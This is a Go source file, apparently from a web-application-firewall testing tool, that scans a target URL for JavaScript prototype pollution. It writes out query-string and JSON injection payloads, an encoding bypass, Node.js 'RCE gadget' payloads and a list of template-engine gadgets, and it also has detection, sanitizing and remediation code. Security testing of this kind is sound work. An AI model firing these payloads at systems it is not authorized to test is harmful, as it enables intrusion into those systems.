// Package prototype provides JavaScript prototype pollution detection capabilities.
// It tests for client-side and server-side prototype pollution vulnerabilities
// that can lead to XSS, denial of service, or remote code execution.
package prototype

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/regexcache"
	"github.com/waftester/waftester/pkg/ui"
)

// VulnerabilityType represents the type of prototype pollution vulnerability
type VulnerabilityType string

const (
	VulnClientSide    VulnerabilityType = "client-side-prototype-pollution"
	VulnServerSide    VulnerabilityType = "server-side-prototype-pollution"
	VulnQueryParam    VulnerabilityType = "query-param-pollution"
	VulnJSONBody      VulnerabilityType = "json-body-pollution"
	VulnMergeFunction VulnerabilityType = "merge-function-pollution"
	VulnDeepCopy      VulnerabilityType = "deep-copy-pollution"
	VulnRCE           VulnerabilityType = "prototype-pollution-rce"
)

// Vulnerability represents a detected prototype pollution vulnerability
type Vulnerability struct {
	finding.Vulnerability
	Type   VulnerabilityType `json:"type"`
	Gadget string            `json:"gadget,omitempty"`
}

// Payload represents a prototype pollution payload
type Payload struct {
	Value       string
	Type        VulnerabilityType
	Description string
	IsJSON      bool
}

// ScanResult contains the results of a prototype pollution scan
type ScanResult struct {
	URL             string          `json:"url"`
	StartTime       time.Time       `json:"start_time"`
	EndTime         time.Time       `json:"end_time"`
	Duration        time.Duration   `json:"duration"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	TestedPayloads  int             `json:"tested_payloads"`
}

// TesterConfig configures the prototype pollution tester
type TesterConfig struct {
	attackconfig.Base
	TestParams []string
}

// Tester performs prototype pollution tests
type Tester struct {
	config *TesterConfig
	client *http.Client
}

// DefaultConfig returns a default configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Base: attackconfig.Base{
			Timeout:     duration.HTTPFuzzing,
			UserAgent:   ui.UserAgent(),
			Concurrency: defaults.ConcurrencyLow,
		},
		TestParams: []string{
			"config",
			"data",
			"options",
			"settings",
			"params",
			"props",
			"query",
			"filter",
			"args",
		},
	}
}

// NewTester creates a new prototype pollution tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = httpclient.Default()
	}

	return &Tester{
		config: config,
		client: client,
	}
}

// GetPayloads returns prototype pollution payloads
func (t *Tester) GetPayloads() []Payload {
	marker := "ppmarker"

	return []Payload{
		// Query parameter pollution
		{
			Value:       "__proto__[test]=" + marker,
			Type:        VulnQueryParam,
			Description: "Basic __proto__ injection",
		},
		{
			Value:       "__proto__.test=" + marker,
			Type:        VulnQueryParam,
			Description: "Dot notation __proto__",
		},
		{
			Value:       "constructor[prototype][test]=" + marker,
			Type:        VulnQueryParam,
			Description: "Constructor prototype injection",
		},
		{
			Value:       "constructor.prototype.test=" + marker,
			Type:        VulnQueryParam,
			Description: "Constructor dot notation",
		},

		// URL-encoded variants
		{
			Value:       "__proto__%5Btest%5D=" + marker,
			Type:        VulnQueryParam,
			Description: "URL-encoded __proto__",
		},
		{
			Value:       "__%70roto__%5Btest%5D=" + marker,
			Type:        VulnQueryParam,
			Description: "Partial encoding bypass",
		},

		// JSON body pollution
		{
			Value:       `{"__proto__":{"test":"` + marker + `"}}`,
			Type:        VulnJSONBody,
			Description: "JSON __proto__ pollution",
			IsJSON:      true,
		},
		{
			Value:       `{"constructor":{"prototype":{"test":"` + marker + `"}}}`,
			Type:        VulnJSONBody,
			Description: "JSON constructor pollution",
			IsJSON:      true,
		},

		// Nested pollution
		{
			Value:       `{"a":{"__proto__":{"test":"` + marker + `"}}}`,
			Type:        VulnJSONBody,
			Description: "Nested __proto__ pollution",
			IsJSON:      true,
		},
		{
			Value:       `{"__proto__":{"__proto__":{"test":"` + marker + `"}}}`,
			Type:        VulnJSONBody,
			Description: "Double __proto__ pollution",
			IsJSON:      true,
		},

		// Array injection
		{
			Value:       `[{"__proto__":{"test":"` + marker + `"}}]`,
			Type:        VulnJSONBody,
			Description: "Array __proto__ pollution",
			IsJSON:      true,
		},

		// Server-side RCE gadgets
		{
			Value:       `{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect"}}`,
			Type:        VulnRCE,
			Description: "Node.js RCE via shell gadget",
			IsJSON:      true,
		},
		{
			Value:       `{"__proto__":{"argv":["node","--eval","process.exit()"]}}`,
			Type:        VulnRCE,
			Description: "Node.js RCE via argv gadget",
			IsJSON:      true,
		},
	}
}

// TestParameter tests a specific parameter for prototype pollution
func (t *Tester) TestParameter(ctx context.Context, baseURL string, param string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	payloads := t.GetPayloads()

	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		if payload.IsJSON {
			// Test in JSON body
			vuln, err := t.testJSONBody(ctx, baseURL, param, payload)
			if err != nil {
				continue
			}
			if vuln != nil {
				vulns = append(vulns, *vuln)
				t.config.NotifyVulnerabilityFound()
			}
		} else {
			// Test in query string
			vuln, err := t.testQueryParam(ctx, baseURL, payload)
			if err != nil {
				continue
			}
			if vuln != nil {
				vulns = append(vulns, *vuln)
				t.config.NotifyVulnerabilityFound()
			}
		}
	}

	return vulns, nil
}

// testQueryParam tests prototype pollution via query parameters
func (t *Tester) testQueryParam(ctx context.Context, baseURL string, payload Payload) (*Vulnerability, error) {
	testURL := baseURL
	if strings.Contains(testURL, "?") {
		testURL += "&" + payload.Value
	} else {
		testURL += "?" + payload.Value
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBody(resp.Body, iohelper.MediumMaxBodySize)

	evidence := t.detectPollution(string(body), resp.Header)
	if evidence != "" {
		return &Vulnerability{
			Vulnerability: finding.Vulnerability{
				Description: payload.Description,
				Severity:    getSeverity(payload.Type),
				URL:         testURL,
				Payload:     payload.Value,
				Evidence:    evidence,
				Remediation: GetPrototypePollutionRemediation(),
				CVSS:        getCVSS(payload.Type),
			},
			Type: payload.Type,
		}, nil
	}

	return nil, nil
}

// testJSONBody tests prototype pollution via JSON body
func (t *Tester) testJSONBody(ctx context.Context, targetURL string, param string, payload Payload) (*Vulnerability, error) {
	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
		strings.NewReader(payload.Value))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", defaults.ContentTypeJSON)
	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBody(resp.Body, iohelper.MediumMaxBodySize)

	evidence := t.detectPollution(string(body), resp.Header)
	if evidence != "" {
		return &Vulnerability{
			Vulnerability: finding.Vulnerability{
				Description: payload.Description,
				Severity:    getSeverity(payload.Type),
				URL:         targetURL,
				Parameter:   param,
				Payload:     payload.Value,
				Evidence:    evidence,
				Remediation: GetPrototypePollutionRemediation(),
				CVSS:        getCVSS(payload.Type),
			},
			Type: payload.Type,
		}, nil
	}

	return nil, nil
}

// detectPollution checks if the response indicates prototype pollution
func (t *Tester) detectPollution(body string, headers http.Header) string {
	// Check for polluted property appearing in JSON response (more specific).
	// This must come before the general ppmarker check so we can distinguish
	// between a generic marker echo and actual property pollution.
	if strings.Contains(body, `"test":`) && strings.Contains(body, "ppmarker") {
		return "Polluted property appeared in response"
	}

	// Check for our marker in response (general case)
	if strings.Contains(body, "ppmarker") {
		return "Marker found in response - pollution successful"
	}

	// Check for error patterns indicating pollution attempt was processed
	errorPatterns := []string{
		`(?i)__proto__`,
		`(?i)constructor.*prototype`,
		`(?i)Object\.prototype`,
		`(?i)prototype pollution`,
		`(?i)cannot set property.*prototype`,
		`(?i)Object\.assign.*circular`,
	}

	for _, pattern := range errorPatterns {
		re := regexcache.MustGet(pattern)
		if match := re.FindString(body); match != "" {
			return fmt.Sprintf("Pollution pattern in response: %s", match)
		}
	}

	return ""
}

// Scan performs a comprehensive prototype pollution scan
func (t *Tester) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	startTime := time.Now()
	result := &ScanResult{
		URL:       targetURL,
		StartTime: startTime,
	}

	payloads := t.GetPayloads()
	totalPayloads := 0

	// Test each parameter
	for _, param := range t.config.TestParams {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		vulns, err := t.TestParameter(ctx, targetURL, param)
		if err != nil {
			continue
		}
		result.Vulnerabilities = append(result.Vulnerabilities, vulns...)
		totalPayloads += len(payloads)
	}

	result.TestedPayloads = totalPayloads
	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(startTime)

	return result, nil
}

// Helper functions

func getSeverity(vulnType VulnerabilityType) finding.Severity {
	switch vulnType {
	case VulnRCE:
		return finding.Critical
	case VulnServerSide:
		return finding.High
	case VulnClientSide, VulnJSONBody:
		return finding.Medium
	case VulnQueryParam:
		return finding.Medium
	default:
		return finding.Medium
	}
}

func getCVSS(vulnType VulnerabilityType) float64 {
	switch vulnType {
	case VulnRCE:
		return 9.8
	case VulnServerSide:
		return 8.1
	case VulnClientSide:
		return 6.1
	case VulnJSONBody:
		return 7.5
	case VulnQueryParam:
		return 6.1
	default:
		return 6.0
	}
}

// Remediation guidance

// GetPrototypePollutionRemediation returns remediation guidance
func GetPrototypePollutionRemediation() string {
	return `To fix prototype pollution vulnerabilities:
1. Use Object.create(null) for objects without prototype chain
2. Freeze Object.prototype with Object.freeze(Object.prototype)
3. Validate and sanitize all user input before object merging
4. Use Map instead of plain objects for key-value storage
5. Block __proto__, constructor, and prototype keys in user input
6. Use safe merge libraries that ignore prototype properties
7. Implement Content-Security-Policy to mitigate XSS gadgets
8. Update vulnerable libraries (lodash, jQuery, etc.)
9. Use JSON Schema validation for API inputs`
}

// AllVulnerabilityTypes returns all prototype pollution vulnerability types
func AllVulnerabilityTypes() []VulnerabilityType {
	return []VulnerabilityType{
		VulnClientSide,
		VulnServerSide,
		VulnQueryParam,
		VulnJSONBody,
		VulnMergeFunction,
		VulnDeepCopy,
		VulnRCE,
	}
}

// IsPrototypePollutionPayload checks if a string contains pollution patterns
func IsPrototypePollutionPayload(input string) bool {
	patterns := []string{
		"__proto__",
		"constructor.prototype",
		"constructor[prototype]",
		"Object.prototype",
	}

	lower := strings.ToLower(input)
	for _, p := range patterns {
		if strings.Contains(lower, strings.ToLower(p)) {
			return true
		}
	}

	return false
}

// SanitizePrototypePollution removes prototype pollution patterns
func SanitizePrototypePollution(input string) string {
	dangerous := []string{
		"__proto__",
		"constructor",
		"prototype",
	}

	// Loop until stable to prevent bypass via nested payloads.
	// e.g. "__pro__proto__to__" → single pass removes inner "__proto__"
	// leaving "__proto__" — the loop catches the residual.
	result := input
	for {
		prev := result
		for _, d := range dangerous {
			result = strings.ReplaceAll(result, d, "")
		}
		if result == prev {
			break
		}
	}

	return result
}

// GeneratePollutionPayloads generates custom prototype pollution payloads
func GeneratePollutionPayloads(property, value string) []Payload {
	return []Payload{
		{
			Value:       fmt.Sprintf(`{"__proto__":{"%s":"%s"}}`, property, value),
			Type:        VulnJSONBody,
			Description: fmt.Sprintf("Pollute %s property", property),
			IsJSON:      true,
		},
		{
			Value:       fmt.Sprintf("__proto__[%s]=%s", property, url.QueryEscape(value)),
			Type:        VulnQueryParam,
			Description: fmt.Sprintf("Query param pollute %s", property),
		},
		{
			Value:       fmt.Sprintf(`{"constructor":{"prototype":{"%s":"%s"}}}`, property, value),
			Type:        VulnJSONBody,
			Description: fmt.Sprintf("Constructor pollute %s", property),
			IsJSON:      true,
		},
	}
}

// KnownGadgets returns known prototype pollution gadgets
func KnownGadgets() []string {
	return []string{
		"shell",              // Node.js child_process
		"NODE_OPTIONS",       // Node.js environment
		"env",                // Environment variables
		"argv",               // Command arguments
		"mainModule",         // Node.js main module
		"outputFunctionName", // EJS template engine
		"escapeFunction",     // Pug template engine
		"compileDebug",       // Pug template engine
		"sourceURL",          // Chrome DevTools
		"__sourceURL",        // Vue.js
	}
}

// VulnerabilityToJSON converts vulnerability to JSON
func VulnerabilityToJSON(v Vulnerability) (string, error) {
	data, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return "", err
	}
	return string(data), nil
}
